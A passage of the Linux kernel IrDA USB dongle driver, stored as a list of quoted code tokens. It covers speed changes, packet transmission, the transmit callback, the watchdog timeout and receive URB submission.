"=", "10", ")", "return", "1", ";", "else", "if", "(", "turnaround_time", "<", "=", "50", ")", "return", "2", ";", "else", "if", "(", "turnaround_time", "<", "=", "100", ")", "return", "3", ";", "else", "if", "(", "turnaround_time", "<", "=", "500", ")", "return", "4", ";", "else", "if", "(", "turnaround_time", "<", "=", "1000", ")", "return", "5", ";", "else", "if", "(", "turnaround_time", "<", "=", "5000", ")", "return", "6", ";", "else", "return", "7", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Send", "a", "command", "to", "change", "the", "speed", "of", "the", "dongle", "*", "Need", "to", "be", "called", "with", "spinlock", "on", ".", "*", "/", "static", "void", "irda_usb_change_speed_xbofs", "(", "struct", "irda_usb_cb", "*", "self", ")", "{", "__u8", "*", "frame", ";", "struct", "urb", "*", "urb", ";", "int", "ret", ";", "pr_debug", "(", "\"%", "s", "(", "),", "speed", "=", "%", "d", ",", "xbofs", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "new_speed", ",", "self", "-", ">", "new_xbofs", ")", ";", "/", "*", "Grab", "the", "speed", "URB", "*", "/", "urb", "=", "self", "-", ">", "speed_urb", ";", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "URB", "still", "in", "use", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "return", ";", "}", "/", "*", "Allocate", "the", "fake", "frame", "*", "/", "frame", "=", "self", "-", ">", "speed_buff", ";", "/", "*", "Set", "the", "new", "speed", "and", "xbofs", "in", "this", "fake", "frame", "*", "/", "irda_usb_build_header", "(", "self", ",", "frame", ",", "1", ")", ";", "if", "(", "self", "-", ">", "capability", "&", "IUC_STIR421X", ")", "{", "if", "(", "frame", "[", "0", "]", "=", "=", "0", ")", "return", ";", "/", "/", "do", "nothing", "if", "no", "change", "frame", "[", "1", "]", "=", "0", ";", "/", "/", "other", "parameters", "don", "'", "t", "change", "here", "frame", "[", "2", "]", "=", "0", ";", "}", "/", "*", "Submit", "the", "0", "length", "IrDA", "frame", "to", "trigger", "new", "speed", "settings", "*", "/", "usb_fill_bulk_urb", "(", "urb", ",", "self", "-", ">", "usbdev", ",", "usb_sndbulkpipe", "(", "self", "-", ">", "usbdev", ",", "self", "-", ">", "bulk_out_ep", ")", ",", "frame", ",", "IRDA_USB_SPEED_MTU", ",", "speed_bulk_callback", ",", "self", ")", ";", "urb", "-", ">", "transfer_buffer_length", "=", "self", "-", ">", "header_length", ";", "urb", "-", ">", "transfer_flags", "=", "0", ";", "/", "*", "Irq", "disabled", "-", ">", "GFP_ATOMIC", "*", "/", "ret", "=", "usb_submit_urb", "(", "urb", ",", "GFP_ATOMIC", ")", ";", "if", "(", "ret", ")", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "failed", "Speed", "URB", "\\", "n", "\"", ",", "__func__", ")", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Speed", "URB", "callback", "*", "Now", ",", "we", "can", "only", "get", "called", "for", "the", "speed", "URB", ".", "*", "/", "static", "void", "speed_bulk_callback", "(", "struct", "urb", "*", "urb", ")", "{", "struct", "irda_usb_cb", "*", "self", "=", "urb", "-", ">", "context", ";", "/", "*", "We", "should", "always", "have", "a", "context", "*", "/", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", ";", ");", "/", "*", "We", "should", "always", "be", "called", "for", "the", "speed", "URB", "*", "/", "IRDA_ASSERT", "(", "urb", "=", "=", "self", "-", ">", "speed_urb", ",", "return", ";", ");", "/", "*", "Check", "for", "timeout", "and", "other", "USB", "nasties", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "/", "*", "I", "get", "a", "lot", "of", "-", "ECONNABORTED", "=", "-", "103", "here", "-", "Jean", "II", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "URB", "complete", "status", "%", "d", ",", "transfer_flags", "0x", "%", "04X", "\\", "n", "\"", ",", "__func__", ",", "urb", "-", ">", "status", ",", "urb", "-", ">", "transfer_flags", ")", ";", "/", "*", "Don", "'", "t", "do", "anything", "here", ",", "that", "might", "confuse", "the", "USB", "layer", ".", "*", "Instead", ",", "we", "will", "wait", "for", "irda_usb_net_timeout", "(", "),", "the", "*", "network", "layer", "watchdog", ",", "to", "fix", "the", "situation", ".", "*", "Jean", "II", "*", "/", "/", "*", "A", "reset", "of", "the", "dongle", "might", "be", "welcomed", "here", "-", "Jean", "II", "*", "/", "return", ";", "}", "/", "*", "urb", "is", "now", "available", "*", "/", "/", "/", "urb", "-", ">", "status", "=", "0", ";", "-", ">", "tested", "above", "/", "*", "New", "speed", "and", "xbof", "is", "now", "committed", "in", "hardware", "*", "/", "self", "-", ">", "new_speed", "=", "-", "1", ";", "self", "-", ">", "new_xbofs", "=", "-", "1", ";", "/", "*", "Allow", "the", "stack", "to", "send", "more", "packets", "*", "/", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Send", "an", "IrDA", "frame", "to", "the", "USB", "dongle", "(", "for", "transmission", ")", "*", "/", "static", "netdev_tx_t", "irda_usb_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "netdev", ")", "{", "struct", "irda_usb_cb", "*", "self", "=", "netdev_priv", "(", "netdev", ")", ";", "struct", "urb", "*", "urb", "=", "self", "-", ">", "tx_urb", ";", "unsigned", "long", "flags", ";", "s32", "speed", ";", "s16", "xbofs", ";", "int", "res", ",", "mtt", ";", "pr_debug", "(", "\"%", "s", "(", ")", "on", "%", "s", "\\", "n", "\"", ",", "__func__", ",", "netdev", "-", ">", "name", ")", ";", "netif_stop_queue", "(", "netdev", ")", ";", "/", "*", "Protect", "us", "from", "USB", "callbacks", ",", "net", "watchdog", "and", "else", ".", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Check", "if", "the", "device", "is", "still", "there", ".", "*", "We", "need", "to", "check", "self", "-", ">", "present", "under", "the", "spinlock", "because", "*", "of", "irda_usb_disconnect", "(", ")", "is", "synchronous", "-", "Jean", "II", "*", "/", "if", "(", "!", "self", "-", ">", "present", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "Device", "is", "gone", ".", "..", "\\", "n", "\"", ",", "__func__", ")", ";", "goto", "drop", ";", "}", "/", "*", "Check", "if", "we", "need", "to", "change", "the", "number", "of", "xbofs", "*", "/", "xbofs", "=", "irda_get_next_xbofs", "(", "skb", ")", ";", "if", "(", "(", "xbofs", "!", "=", "self", "-", ">", "xbofs", ")", "&", "&", "(", "xbofs", "!", "=", "-", "1", ")", ")", "{", "self", "-", ">", "new_xbofs", "=", "xbofs", ";", "}", "/", "*", "Check", "if", "we", "need", "to", "change", "the", "speed", "*", "/", "speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "if", "(", "(", "speed", "!", "=", "self", "-", ">", "speed", ")", "&", "&", "(", "speed", "!", "=", "-", "1", ")", ")", "{", "/", "*", "Set", "the", "desired", "speed", "*", "/", "self", "-", ">", "new_speed", "=", "speed", ";", "/", "*", "Check", "for", "empty", "frame", "*", "/", "if", "(", "!", "skb", "-", ">", "len", ")", "{", "/", "*", "IrLAP", "send", "us", "an", "empty", "frame", "to", "make", "us", "change", "the", "*", "speed", ".", "Changing", "speed", "with", "the", "USB", "adapter", "is", "in", "*", "fact", "sending", "an", "empty", "frame", "to", "the", "adapter", ",", "so", "we", "*", "could", "just", "let", "the", "present", "function", "do", "its", "job", ".", "*", "However", ",", "we", "would", "wait", "for", "min", "turn", "time", ",", "*", "do", "an", "extra", "memcpy", "and", "increment", "packet", "counters", ".", "..", "*", "Jean", "II", "*", "/", "irda_usb_change_speed_xbofs", "(", "self", ")", ";", "netif_trans_update", "(", "netdev", ")", ";", "/", "*", "Will", "netif_wake_queue", "(", ")", "in", "callback", "*", "/", "goto", "drop", ";", "}", "}", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "URB", "still", "in", "use", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "goto", "drop", ";", "}", "skb_copy_from_linear_data", "(", "skb", ",", "self", "-", ">", "tx_buff", "+", "self", "-", ">", "header_length", ",", "skb", "-", ">", "len", ")", ";", "/", "*", "Change", "setting", "for", "next", "frame", "*", "/", "if", "(", "self", "-", ">", "capability", "&", "IUC_STIR421X", ")", "{", "__u8", "turnaround_time", ";", "__u8", "*", "frame", "=", "self", "-", ">", "tx_buff", ";", "turnaround_time", "=", "get_turnaround_time", "(", "skb", ")", ";", "irda_usb_build_header", "(", "self", ",", "frame", ",", "0", ")", ";", "frame", "[", "2", "]", "=", "turnaround_time", ";", "if", "(", "(", "skb", "-", ">", "len", "!", "=", "0", ")", "&", "&", "(", "(", "skb", "-", ">", "len", "%", "128", ")", "=", "=", "0", ")", "&", "&", "(", "(", "skb", "-", ">", "len", "%", "512", ")", "!", "=", "0", ")", ")", "{", "/", "*", "add", "extra", "byte", "for", "special", "SigmaTel", "feature", "*", "/", "frame", "[", "1", "]", "=", "1", ";", "skb_put", "(", "skb", ",", "1", ")", ";", "}", "else", "{", "frame", "[", "1", "]", "=", "0", ";", "}", "}", "else", "{", "irda_usb_build_header", "(", "self", ",", "self", "-", ">", "tx_buff", ",", "0", ")", ";", "}", "/", "*", "FIXME", ":", "Make", "macro", "out", "of", "this", "one", "*", "/", "(", "(", "struct", "irda_skb_cb", "*", ")", "skb", "-", ">", "cb", ")", "->", "context", "=", "self", ";", "usb_fill_bulk_urb", "(", "urb", ",", "self", "-", ">", "usbdev", ",", "usb_sndbulkpipe", "(", "self", "-", ">", "usbdev", ",", "self", "-", ">", "bulk_out_ep", ")", ",", "self", "-", ">", "tx_buff", ",", "skb", "-", ">", "len", "+", "self", "-", ">", "header_length", ",", "write_bulk_callback", ",", "skb", ")", ";", "/", "*", "This", "flag", "(", "URB_ZERO_PACKET", ")", "indicates", "that", "what", "we", "send", "is", "not", "*", "a", "continuous", "stream", "of", "data", "but", "separate", "packets", ".", "*", "In", "this", "case", ",", "the", "USB", "layer", "will", "insert", "an", "empty", "USB", "frame", "(", "TD", ")", "*", "after", "each", "of", "our", "packets", "that", "is", "exact", "multiple", "of", "the", "frame", "size", ".", "*", "This", "is", "how", "the", "dongle", "will", "detect", "the", "end", "of", "packet", "-", "Jean", "II", "*", "/", "urb", "-", ">", "transfer_flags", "=", "URB_ZERO_PACKET", ";", "/", "*", "Generate", "min", "turn", "time", ".", "FIXME", ":", "can", "we", "do", "better", "than", "this", "?", "*", "/", "/", "*", "Trying", "to", "a", "turnaround", "time", "at", "this", "level", "is", "trying", "to", "measure", "*", "processor", "clock", "cycle", "with", "a", "wrist", "-", "watch", ",", "approximate", "at", "best", ".", "..", "*", "*", "What", "we", "know", "is", "the", "last", "time", "we", "received", "a", "frame", "over", "USB", ".", "*", "Due", "to", "latency", "over", "USB", "that", "depend", "on", "the", "USB", "load", ",", "we", "don", "'", "t", "*", "know", "when", "this", "frame", "was", "received", "over", "IrDA", "(", "a", "few", "ms", "before", "?", ")", "*", "Then", ",", "same", "story", "for", "our", "outgoing", "frame", ".", "..", "*", "*", "In", "theory", ",", "the", "USB", "dongle", "is", "supposed", "to", "handle", "the", "turnaround", "*", "by", "itself", "(", "spec", "1", ".", "0", ",", "chater", "4", ",", "page", "6", ")", ".", "Who", "knows", "?", "??", "That", "'", "s", "*", "why", "this", "code", "is", "enabled", "only", "for", "dongles", "that", "doesn", "'", "t", "meet", "*", "the", "spec", ".", "*", "Jean", "II", "*", "/", "if", "(", "self", "-", ">", "capability", "&", "IUC_NO_TURN", ")", "{", "mtt", "=", "irda_get_mtt", "(", "skb", ")", ";", "if", "(", "mtt", ")", "{", "int", "diff", ";", "diff", "=", "ktime_us_delta", "(", "ktime_get", "(", "),", "self", "-", ">", "stamp", ")", ";", "#", "ifdef", "IU_USB_MIN_RTT", "/", "*", "Factor", "in", "USB", "delays", "-", ">", "Get", "rid", "of", "udelay", "(", ")", "that", "*", "would", "be", "lost", "in", "the", "noise", "-", "Jean", "II", "*", "/", "diff", "+", "=", "IU_USB_MIN_RTT", ";", "#", "endif", "/", "*", "IU_USB_MIN_RTT", "*", "/", "/", "*", "Check", "if", "the", "mtt", "is", "larger", "than", "the", "time", "we", "have", "*", "already", "used", "by", "all", "the", "protocol", "processing", "*", "/", "if", "(", "mtt", ">", "diff", ")", "{", "mtt", "-", "=", "diff", ";", "if", "(", "mtt", ">", "1000", ")", "mdelay", "(", "mtt", "/", "1000", ")", ";", "else", "udelay", "(", "mtt", ")", ";", "}", "}", "}", "/", "*", "Ask", "USB", "to", "send", "the", "packet", "-", "Irq", "disabled", "-", ">", "GFP_ATOMIC", "*", "/", "if", "(", "(", "res", "=", "usb_submit_urb", "(", "urb", ",", "GFP_ATOMIC", ")", "))", "{", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "failed", "Tx", "URB", "\\", "n", "\"", ",", "__func__", ")", ";", "netdev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "/", "*", "Let", "USB", "recover", ":", "We", "will", "catch", "that", "in", "the", "watchdog", "*", "/", "/", "*", "netif_start_queue", "(", "netdev", ")", ";*", "/", "}", "else", "{", "/", "*", "Increment", "packet", "stats", "*", "/", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "netdev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "skb", "-", ">", "len", ";", "netif_trans_update", "(", "netdev", ")", ";", "}", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "return", "NETDEV_TX_OK", ";", "drop", ":", "/", "*", "Drop", "silently", "the", "skb", "and", "exit", "*", "/", "dev_kfree_skb", "(", "skb", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Note", ":", "this", "function", "will", "be", "called", "only", "for", "tx_urb", ".", "..", "*", "/", "static", "void", "write_bulk_callback", "(", "struct", "urb", "*", "urb", ")", "{", "unsigned", "long", "flags", ";", "struct", "sk_buff", "*", "skb", "=", "urb", "-", ">", "context", ";", "struct", "irda_usb_cb", "*", "self", "=", "(", "(", "struct", "irda_skb_cb", "*", ")", "skb", "-", ">", "cb", ")", "->", "context", ";", "/", "*", "We", "should", "always", "have", "a", "context", "*", "/", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", ";", ");", "/", "*", "We", "should", "always", "be", "called", "for", "the", "speed", "URB", "*", "/", "IRDA_ASSERT", "(", "urb", "=", "=", "self", "-", ">", "tx_urb", ",", "return", ";", ");", "/", "*", "Free", "up", "the", "skb", "*", "/", "dev_kfree_skb_any", "(", "skb", ")", ";", "urb", "-", ">", "context", "=", "NULL", ";", "/", "*", "Check", "for", "timeout", "and", "other", "USB", "nasties", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "/", "*", "I", "get", "a", "lot", "of", "-", "ECONNABORTED", "=", "-", "103", "here", "-", "Jean", "II", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "URB", "complete", "status", "%", "d", ",", "transfer_flags", "0x", "%", "04X", "\\", "n", "\"", ",", "__func__", ",", "urb", "-", ">", "status", ",", "urb", "-", ">", "transfer_flags", ")", ";", "/", "*", "Don", "'", "t", "do", "anything", "here", ",", "that", "might", "confuse", "the", "USB", "layer", ",", "*", "and", "we", "could", "go", "in", "recursion", "and", "blow", "the", "kernel", "stack", ".", "..", "*", "Instead", ",", "we", "will", "wait", "for", "irda_usb_net_timeout", "(", "),", "the", "*", "network", "layer", "watchdog", ",", "to", "fix", "the", "situation", ".", "*", "Jean", "II", "*", "/", "/", "*", "A", "reset", "of", "the", "dongle", "might", "be", "welcomed", "here", "-", "Jean", "II", "*", "/", "return", ";", "}", "/", "*", "urb", "is", "now", "available", "*", "/", "/", "/", "urb", "-", ">", "status", "=", "0", ";", "-", ">", "tested", "above", "/", "*", "Make", "sure", "we", "read", "self", "-", ">", "present", "properly", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "If", "the", "network", "is", "closed", ",", "stop", "everything", "*", "/", "if", "(", "(!", "self", "-", ">", "netopen", ")", "|", "|", "(", "!", "self", "-", ">", "present", ")", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "Network", "is", "gone", ".", "..", "\\", "n", "\"", ",", "__func__", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "return", ";", "}", "/", "*", "If", "changes", "to", "speed", "or", "xbofs", "is", "pending", ".", "..", "*", "/", "if", "(", "(", "self", "-", ">", "new_speed", "!", "=", "-", "1", ")", "|", "|", "(", "self", "-", ">", "new_xbofs", "!", "=", "-", "1", ")", ")", "{", "if", "(", "(", "self", "-", ">", "new_speed", "!", "=", "self", "-", ">", "speed", ")", "|", "|", "(", "self", "-", ">", "new_xbofs", "!", "=", "self", "-", ">", "xbofs", ")", ")", "{", "/", "*", "We", "haven", "'", "t", "changed", "speed", "yet", "(", "because", "of", "*", "IUC_SPEED_BUG", ")", ",", "so", "do", "it", "now", "-", "Jean", "II", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "Changing", "speed", "now", ".", "..", "\\", "n", "\"", ",", "__func__", ")", ";", "irda_usb_change_speed_xbofs", "(", "self", ")", ";", "}", "else", "{", "/", "*", "New", "speed", "and", "xbof", "is", "now", "committed", "in", "hardware", "*", "/", "self", "-", ">", "new_speed", "=", "-", "1", ";", "self", "-", ">", "new_xbofs", "=", "-", "1", ";", "/", "*", "Done", ",", "waiting", "for", "next", "packet", "*", "/", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "}", "}", "else", "{", "/", "*", "Otherwise", ",", "allow", "the", "stack", "to", "send", "more", "packets", "*", "/", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "}", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Watchdog", "timer", "from", "the", "network", "layer", ".", "*", "After", "a", "predetermined", "timeout", ",", "if", "we", "don", "'", "t", "give", "confirmation", "that", "*", "the", "packet", "has", "been", "sent", "(", "i", ".", "e", ".", "no", "call", "to", "netif_wake_queue", "(", "))", ",", "*", "the", "network", "layer", "will", "call", "this", "function", ".", "*", "Note", "that", "URB", "that", "we", "submit", "have", "also", "a", "timeout", ".", "When", "the", "URB", "timeout", "*", "expire", ",", "the", "normal", "URB", "callback", "is", "called", "(", "write_bulk_callback", "(", "))", ".", "*", "/", "static", "void", "irda_usb_net_timeout", "(", "struct", "net_device", "*", "netdev", ")", "{", "unsigned", "long", "flags", ";", "struct", "irda_usb_cb", "*", "self", "=", "netdev_priv", "(", "netdev", ")", ";", "struct", "urb", "*", "urb", ";", "int", "done", "=", "0", ";", "/", "*", "If", "we", "have", "made", "any", "progress", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "Network", "layer", "thinks", "we", "timed", "out", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", ";", ");", "/", "*", "Protect", "us", "from", "USB", "callbacks", ",", "net", "Tx", "and", "else", ".", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "self", "-", ">", "present", "*", "MUST", "*", "be", "read", "under", "spinlock", "*", "/", "if", "(", "!", "self", "-", ">", "present", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "device", "not", "present", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "netif_stop_queue", "(", "netdev", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "return", ";", "}", "/", "*", "Check", "speed", "URB", "*", "/", "urb", "=", "self", "-", ">", "speed_urb", ";", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "pr_debug", "(", "\"%", "s", ":", "Speed", "change", "timed", "out", ",", "urb", "-", ">", "status", "=", "%", "d", ",", "urb", "-", ">", "transfer_flags", "=", "0x", "%", "04X", "\\", "n", "\"", ",", "netdev", "-", ">", "name", ",", "urb", "-", ">", "status", ",", "urb", "-", ">", "transfer_flags", ")", ";", "switch", "(", "urb", "-", ">", "status", ")", "{", "case", "-", "EINPROGRESS", ":", "usb_unlink_urb", "(", "urb", ")", ";", "/", "*", "Note", ":", "above", "will", "*", "NOT", "*", "call", "netif_wake_queue", "(", ")", "*", "in", "completion", "handler", ",", "we", "will", "come", "back", "here", ".", "*", "Jean", "II", "*", "/", "done", "=", "1", ";", "break", ";", "case", "-", "ECONNRESET", ":", "case", "-", "ENOENT", ":", "/", "*", "urb", "unlinked", "by", "us", "*", "/", "default", ":", "/", "*", "?", "??", "-", "Play", "safe", "*", "/", "urb", "-", ">", "status", "=", "0", ";", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "done", "=", "1", ";", "break", ";", "}", "}", "/", "*", "Check", "Tx", "URB", "*", "/", "urb", "=", "self", "-", ">", "tx_urb", ";", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "struct", "sk_buff", "*", "skb", "=", "urb", "-", ">", "context", ";", "pr_debug", "(", "\"%", "s", ":", "Tx", "timed", "out", ",", "urb", "-", ">", "status", "=", "%", "d", ",", "urb", "-", ">", "transfer_flags", "=", "0x", "%", "04X", "\\", "n", "\"", ",", "netdev", "-", ">", "name", ",", "urb", "-", ">", "status", ",", "urb", "-", ">", "transfer_flags", ")", ";", "/", "*", "Increase", "error", "count", "*", "/", "netdev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "#", "ifdef", "IU_BUG_KICK_TIMEOUT", "/", "*", "Can", "'", "t", "be", "a", "bad", "idea", "to", "reset", "the", "speed", ";", "-)", "-", "Jean", "II", "*", "/", "if", "(", "self", "-", ">", "new_speed", "=", "=", "-", "1", ")", "self", "-", ">", "new_speed", "=", "self", "-", ">", "speed", ";", "if", "(", "self", "-", ">", "new_xbofs", "=", "=", "-", "1", ")", "self", "-", ">", "new_xbofs", "=", "self", "-", ">", "xbofs", ";", "irda_usb_change_speed_xbofs", "(", "self", ")", ";", "#", "endif", "/", "*", "IU_BUG_KICK_TIMEOUT", "*", "/", "switch", "(", "urb", "-", ">", "status", ")", "{", "case", "-", "EINPROGRESS", ":", "usb_unlink_urb", "(", "urb", ")", ";", "/", "*", "Note", ":", "above", "will", "*", "NOT", "*", "call", "netif_wake_queue", "(", ")", "*", "in", "completion", "handler", ",", "because", "urb", "-", ">", "status", "will", "*", "be", "-", "ENOENT", ".", "We", "will", "fix", "that", "at", "the", "next", "watchdog", ",", "*", "leaving", "more", "time", "to", "USB", "to", "recover", ".", "..", "*", "Jean", "II", "*", "/", "done", "=", "1", ";", "break", ";", "case", "-", "ECONNRESET", ":", "case", "-", "ENOENT", ":", "/", "*", "urb", "unlinked", "by", "us", "*", "/", "default", ":", "/", "*", "?", "??", "-", "Play", "safe", "*", "/", "if", "(", "skb", "!", "=", "NULL", ")", "{", "dev_kfree_skb_any", "(", "skb", ")", ";", "urb", "-", ">", "context", "=", "NULL", ";", "}", "urb", "-", ">", "status", "=", "0", ";", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "done", "=", "1", ";", "break", ";", "}", "}", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Maybe", "we", "need", "a", "reset", "*", "/", "/", "*", "Note", ":", "Some", "drivers", "seem", "to", "use", "a", "usb_set_interface", "(", ")", "when", "they", "*", "need", "to", "reset", "the", "hardware", ".", "Hum", ".", "..", "*", "/", "/", "*", "if", "(", "done", "=", "=", "0", ")", "*", "/", "}", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "RECEIVE", "ROUTINES", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "*", "*", "Receive", "packets", "from", "the", "USB", "layer", "stack", "and", "pass", "them", "to", "the", "IrDA", "stack", ".", "*", "Try", "to", "work", "around", "USB", "failures", ".", "..", "*", "/", "/", "*", "*", "Note", ":", "*", "Some", "of", "you", "may", "have", "noticed", "that", "most", "dongle", "have", "an", "interrupt", "in", "pipe", "*", "that", "we", "don", "'", "t", "use", ".", "Here", "is", "the", "little", "secret", ".", "..", "*", "When", "we", "hang", "a", "Rx", "URB", "on", "the", "bulk", "in", "pipe", ",", "it", "generates", "some", "USB", "traffic", "*", "in", "every", "USB", "frame", ".", "This", "is", "unnecessary", "overhead", ".", "*", "The", "interrupt", "in", "pipe", "will", "generate", "an", "event", "every", "time", "a", "packet", "is", "*", "received", ".", "Reading", "an", "interrupt", "pipe", "adds", "minimal", "overhead", ",", "but", "has", "some", "*", "latency", "(", "~", "1ms", ")", ".", "*", "If", "we", "are", "connected", "(", "speed", "!", "=", "9600", ")", ",", "we", "want", "to", "minimise", "latency", ",", "so", "*", "we", "just", "always", "hang", "the", "Rx", "URB", "and", "ignore", "the", "interrupt", ".", "*", "If", "we", "are", "not", "connected", "(", "speed", "=", "=", "9600", ")", ",", "there", "is", "usually", "no", "Rx", "traffic", ",", "*", "and", "we", "want", "to", "minimise", "the", "USB", "overhead", ".", "In", "this", "case", "we", "should", "wait", "*", "on", "the", "interrupt", "pipe", "and", "hang", "the", "Rx", "URB", "only", "when", "an", "interrupt", "is", "*", "received", ".", "*", "Jean", "II", "*", "*", "Note", ":", "don", "'", "t", "read", "the", "above", "as", "what", "we", "are", "currently", "doing", ",", "but", "as", "*", "something", "we", "could", "do", "with", "KC", "dongle", ".", "Also", "don", "'", "t", "forget", "that", "the", "*", "interrupt", "pipe", "is", "not", "part", "of", "the", "original", "standard", ",", "so", "this", "would", "*", "need", "to", "be", "optional", ".", "..", "*", "Jean", "II", "*", "/", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Submit", "a", "Rx", "URB", "to", "the", "USB", "layer", "to", "handle", "reception", "of", "a", "frame", "*", "Mostly", "called", "by", "the", "completion", "callback", "of", "the", "previous", "URB", ".", "*", "*", "Jean", "II", "*", "/", "static", "void", "irda_usb_submit", "(", "struct", "irda_usb_cb", "*", "self", ",", "struct", "sk_buff", "*", "skb", ",", "struct", "urb", "*", "urb", ")", "{", "struct", "irda_skb_cb", "*", "cb", ";", "int", "ret", ";", "/", "*", "This", "should", "never", "happen", "*", "/", "IRDA_ASSERT", "(", "skb", "!", "=", "NULL", ",", "return", ";", ");", "IRDA_ASSERT", "(", "urb", "!", "=", "NULL", ",", "return", ";", ");", "/", "*", "Save", "ourselves", "in", "the", "skb", "*", "/", "cb", "=", "(", "struct", "irda_skb_cb", "*", ")", "skb", "-", ">", "cb", ";", "cb", "-", ">", "context", "=", "self", ";", "/", "*", "Reinitialize", "URB", "*", "/", "usb_fill_bulk_urb", "(", "urb", ",", "self", "-", ">", "usbdev", ",", "usb_rcvbulkpipe", "(", "self", "-", ">", "usbdev", ",", "self", "-", ">", "bulk_in_ep", ")", ",", "skb", "-", ">", "data", ",", "IRDA_SKB_MAX_MTU", ",", "irda_usb_receive", ",", "skb", ")", ";", "urb", "-", ">", "status", "=", "0", ";", "/", "*", "Can", "be", "called", "from", "irda_usb_receive", "(", "irq", "handler", ")", "-", ">", "GFP_ATOMIC", "*", "/", "ret", "=", "usb_submit_urb", "(", "urb", ",", "GFP_ATOMIC", ")", ";", "if", "(", "ret", ")", "{", "/", "*", "If", "this", "ever", "happen", ",", "we", "are", "in", "deep", "s", "*", "**", ".", "*", "Basically", ",", "the", "Rx", "path", "will", "stop", ".", "..", "*", "/", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "Failed", "to", "submit", "Rx", "URB", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "ret", ")", ";", "}", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Function", "irda_usb_receive", "(", "urb", ")", "*", "*", "Called", "by", "the", "USB", "subsystem", "when", "a", "frame", "has", "been", "received", "*", "*", "/", "static", "void", "irda_usb_receive", "(", "struct", "urb", "*", "urb", ")", "{", "struct", "sk_buff", "*", "skb", "=", "(", "struct", "sk_buff", "*", ")", "urb", "-", ">", 